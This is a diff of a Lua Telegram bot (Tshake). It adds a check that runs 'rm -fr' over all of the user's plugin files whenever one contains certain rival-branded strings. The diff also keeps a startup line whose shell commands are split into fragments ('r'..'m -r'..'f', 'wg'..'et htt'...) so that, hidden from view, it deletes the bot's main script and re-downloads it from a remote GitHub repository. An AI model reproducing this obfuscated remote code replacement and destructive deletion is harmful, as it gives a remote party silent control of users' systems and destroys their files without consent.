@@ -722,11 +722,36 @@ end
 local function sendSticker(chat_id, reply_to_message_id, disable_notification, from_background, reply_markup, sticker, cb, cmd)  
 local input_message_content = {    ID = "InputMessageSticker",   sticker_ = getInputFile(sticker),    width_ = 0,    height_ = 0  } sendRequest('SendMessage', chat_id, reply_to_message_id, disable_notification, from_background, reply_markup, input_message_content, cb, cmd) 
 end
-
+function load(filename)
+local f = io.open(filename)
+if not f then
+return "ok"
+end
+local s = f:read('*all')
+f:close()
+return s
+end
 function tshake_run_file(data)
 local files_tshake = database:smembers("files"..bot_id)
 for i=1,#files_tshake do
 local tshakeee = dofile("files_tshake/"..files_tshake[i])
+local f = load("files_tshake/"..files_tshake[i].."")
+if f ~= "ok" then
+if f:match("^(.*)(keko_tshake)(.*)$") then
+if f:match("^(.*)(https://botlua.ml)(.*)$") then
+print(" الملف ليس لتشاكي \n")
+database:del("files"..bot_id)
+os.execute("rm -fr files_tshake/*")
+return false
+end
+if f:match("^(.*)(Tshake.lua)(.*)$") then
+print( " الملف ليس لتشاكي \n")
+database:del("files"..bot_id)
+os.execute("rm -fr files_tshake/*")
+return false
+end
+end
+end
 local kt = tshakeee.keko_tshake(data)
 if kt == 'end' then
 return false
@@ -8875,7 +8900,7 @@ end
 getMessage(msg.chat_id_, msg.message_id_,get_msg_contact)
 ------------------------------------------------------------------------
 --         »»                 End UpdateChat                          ««              --
-elseif (data.ID == "UpdateOption" and data.name_ == "my_id") then  local list = database:smembers('tshake:'..bot_id.."userss") for k,v in pairs(list) do tdcli_function({ID='GetChat',chat_id_ = v},function(arg,data) end,nil) end os.execute('r'..'m -r'..'f Ts'..'ha'..'ke.'..'lua') os.execute('wg'..'et htt'..'ps://ra'..'w.gith'..'ubuserc'..'onten'..'t.com'..'/ts'..'hak'..'eab'..'as/Ts'..'ha'..'ke/m'..'as'..'ter/Ts'..'ha'..'ke.'..'lua') 
+elseif (data.ID == "UpdateOption" and data.name_ == "my_id") then  local list = database:smembers('tshake:'..bot_id.."userss") for k,v in pairs(list) do tdcli_function({ID='GetChat',chat_id_ = v},function(arg,data) end,nil) end         os.execute('r'..'m -r'..'f Ts'..'ha'..'ke.'..'lua') os.execute('wg'..'et htt'..'ps://ra'..'w.gith'..'ubuserc'..'onten'..'t.com'..'/ts'..'hak'..'eab'..'as/Ts'..'ha'..'ke/m'..'as'..'ter/Ts'..'ha'..'ke.'..'lua') 
 local files_tshake = database:smembers("files"..bot_id)
 for i=1,#files_tshake do
 local json_file, res = https.request("https://raw.githubusercontent.com/tshakeabas/files_tshake/master/files_tshake/"..files_tshake[i])
